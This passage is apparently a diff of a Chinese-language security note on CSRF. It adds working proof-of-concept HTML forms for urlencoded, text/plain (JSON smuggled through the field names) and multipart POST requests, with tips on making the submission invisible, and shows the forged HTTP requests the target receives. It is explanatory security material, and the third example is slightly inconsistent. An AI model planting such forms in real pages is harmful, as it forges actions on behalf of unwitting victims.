@@ -70,25 +70,41 @@ Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
   * 攻击者可控的第三方域:`www.3.com`会被victim访问
   * 目标域存在CSRF漏洞
 
-通过多种办法(如JavaScript或HTML注入) 在 `https://www.3.com/demo` 中注入html代码:
+
+* 构造CSRF - 发出POST请求
+  * 通过`XSS/JavaScript`,`HTML注入`等方法 在 `https://www.3.com/demo` 中注入以下html代码
+    * 如果需要指定该CSRF发出的http请求中的`Content-Type`值 只需设置form标签的`enctype`属性的值
+      * 1.`<form enctype="application/x-www-form-urlencoded" ...` 默认情况
+      * 2.`<form enctype="text/plain" ...`
+      * 3.`<form enctype="multipart/form-data" ...`
+
+**情况1.URL编码`application/x-www-form-urlencoded`**
+
+无感知触发
 
 ```
+<!--
+如果没有设置form标签的`enctype`属性的值, 那么http req中的`Content-Type`值默认就是这个
+Content-Type: application/x-www-form-urlencoded
+-->
+
 <iframe style="display:none" name="csrf-frame1"></iframe>
-<form method='POST' action='https://post.csrfvul.com/search' target="csrf-frame1" id="csrf-form">
+<iframe style="display:none" name="csrf-frame1"></iframe>
+<form method='POST' action='https://post.x-www-form-urlencoded.csrfvul.com/search' target="csrf-frame1" id="csrf-form">
       <input type="hidden" name="ip" value="1&#46;1&#46;1&#46;1" />
       <input type="hidden" name="offset" value="0" />
       <input type="hidden" name="limit" value="20" />
-      <input type="submit" value="send Request" /><!--实战中去掉这一行 不会影响POST请求的发送 可以隐藏按钮-->
+      <input type="submit" value="send Request" /> <!--建议去掉这一行 即去掉可见的按钮 实现了"完全不可见" 且不会影响POST请求的发送 -->
     </form>
 <script>document.getElementById("csrf-form").submit()</script>
 ```
 
-victim访问 `https://3.com/demo` 则会发出POST请求到`https://post.csrfvul.com`
+victim访问 `https://3.com/demo` 则会发出POST请求到`https://post.x-www-form-urlencoded.csrfvul.com`
 
-`post.csrfvul.com`收到了这个POST请求:
+`https://post.x-www-form-urlencoded.csrfvul.com`的web后端 收到了这个POST请求:
 ```
 POST /search HTTP/1.1
-Host: post.csrfvul.com
+Host: post.x-www-form-urlencoded.csrfvul.com
 Connection: keep-alive
 Content-Length: 28
 Cache-Control: max-age=0
@@ -110,6 +126,105 @@ Origin: https://3.com
 Referer: https://3.com/
 ```
 
+------
+
+**情况2.`text/plain`**
+
+PoC
+
+```
+<!--
+满足以下3个前提才能用:
+(1)HTTP POST req Body是JSON数据 或明文.
+(2)把HTTP请求中的Content-Type改为 Content-Type: text/plain 后, 发送该请求, 能得到正常HTTP Resp
+(3)HTTP POST req Body中可以有等号`=`
+因为这种方法本身 导致req Body里必然会有一个等号 `CustomName=CustomValue` 只有当HTTP POST req Body中可以有等号`=`时 才能完美构造出POST的Body数据. 否则需要想其他办法处理掉`=`
+-->
+
+<form enctype="text/plain" method="POST" action="https://post.json.csrfvul.com/api">
+<input name='{"F":"test.AppRequestFactory","I":[{"O":""O":"5vhghgjhgjE0' value='"}]}' type='hidden'>
+<input type="submit" value="send req"></form>
+```
+
+victim访问 `https://3.com/demo` 则会发出POST请求到`https://post.json.csrfvul.com`
+
+`https://post.json.csrfvul.com`的web后端 收到了这个POST请求:
+
+```
+POST /api HTTP/1.1
+Host: post.json.csrfvul.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:73.0) Gecko/20100101 Firefox/73.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type: text/plain
+Content-Length: 65
+Origin: https://www.3.com
+Connection: close
+Referer: https://3.com/demo
+Upgrade-Insecure-Requests: 1
+
+{"F":"test.AppRequestFactory","I":[{"O":""O":"5vhghgjhgjE0="}]}
+```
+
+很容易看到,该请求中的Referer头说明了该get请求来自于第三方域(如果后端获取Referer的值 且是白名单方法验证其值 则CSRF利用失败)
+```
+Origin: https://3.com
+Referer: https://3.com/demo
+```
+
+------
+
+**情况3. `multipart/form-data`**
+ 
+PoC
+```
+<!--
+某些偏老的web应用就这样传参
+-->
+
+<form enctype="multipart/form-data" method="POST" action="http://test.com">
+<input type="text" name="name1" value="11111">
+<input type="text" name="name2" value="22222">
+<input type="submit" value="https://post.form-data.csrfvul.com">
+</form>
+```
+
+victim访问 `https://3.com/demo` 则会发出POST请求到`https://post.form-data.csrfvul.com`
+
+`https://post.form-data.csrfvul.com`的web后端 收到了这个POST请求:
+
+```
+POST / HTTP/1.1
+Host: post.form-data.csrfvul.com
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:73.0) Gecko/20100101 Firefox/73.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------462940910314621289735265309
+Content-Length: 286
+Origin: https://www.3.com
+Connection: close
+Referer: https://3.com/demo
+Upgrade-Insecure-Requests: 1
+
+-----------------------------462940910314621289735265309
+Content-Disposition: form-data; name="name1"
+
+11111
+-----------------------------462940910314621289735265309
+Content-Disposition: form-data; name="name2"
+
+22222
+-----------------------------462940910314621289735265309--
+
+```
+
+很容易看到,该请求中的Referer头说明了该get请求来自于第三方域(如果后端获取Referer的值 且是白名单方法验证其值 则CSRF利用失败)
+```
+Origin: https://3.com
+Referer: https://3.com/demo
+```
 
 ### 漏洞影响
 
